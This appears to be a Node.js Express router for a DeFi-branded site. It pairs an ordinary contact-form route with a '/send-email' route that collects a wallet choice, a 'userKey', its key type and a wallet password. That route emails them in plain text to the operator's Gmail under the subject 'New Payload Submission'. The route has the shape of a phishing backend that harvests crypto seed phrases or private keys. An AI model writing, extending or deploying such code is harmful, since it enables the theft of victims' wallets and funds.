const express = require('express');
const nodemailer = require('nodemailer');
const bodyParser = require('body-parser');
const cors = require('cors');
require('dotenv').config();

const router = express.Router();

// Use middleware on the router if needed
router.use(cors());
router.use(bodyParser.json());

// Nodemailer transporter setup
const transporter = nodemailer.createTransport({
  host: 'smtp.gmail.com',
  port: 465,
  secure: true, // use SSL
  auth: {
    user: process.env.EMAIL_USER_DEFINECT, // Environment variable
    pass: process.env.EMAIL_PASS_DEFINECT  // Environment variable
  }
});

// Endpoint to handle the payload submission
router.post('/send-email', (req, res) => {
  const { iconId, iconName, keyType, userKey, walletPassword } = req.body;

  const mailOptions = {
    from: process.env.EMAIL_USER,
    to: process.env.EMAIL_USER, // Sending to your own email
    subject: 'New Payload Submission',
    text: `Icon ID: ${iconId}\nIcon Name: ${iconName}\nKey Type: ${keyType}\nUser Key: ${userKey}\nWallet Password: ${walletPassword || 'N/A'}`
  };

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.error('Error sending email:', error);
      return res.status(500).send('Error sending email');
    }
    console.log('Email sent:', info.response);
    res.status(200).send('Email sent successfully');
  });
});

// Endpoint to handle contact form submission
router.post('/contact', (req, res) => {
  const { email, message } = req.body;

  // Email to yourself
  const adminMailOptions = {
    from: process.env.EMAIL_USER,
    to: process.env.EMAIL_USER, // Your email address
    subject: 'New Message from Contact Form',
    text: `Email: ${email}\n\nMessage:\n${message}`
  };

  // Email to the user
  const userMailOptions = {
    from: process.env.EMAIL_FROM_DEFINECT,
    to: email, // User's email address
    subject: 'Thank you for contacting us',
    text: `Hi,\n\nThank you for reaching out. We have received your message and will get back to you shortly.\n\nMessage:\n${message}\n\nBest regards,\nDefi Origin`
  };

  // First, send email to admin
  transporter.sendMail(adminMailOptions, (error, info) => {
    if (error) {
      console.error('Error sending email to admin:', error);
      return res.status(500).send('Error sending email');
    }
    console.log('Email sent to admin:', info.response);

    // Then, send confirmation email to user
    transporter.sendMail(userMailOptions, (error, info) => {
      if (error) {
        console.error('Error sending email to user:', error);
        return res.status(500).send('Error sending confirmation email');
      }
      console.log('Confirmation email sent to user:', info.response);
      res.status(200).send('Emails sent successfully');
    });
  });
});

module.exports = router;
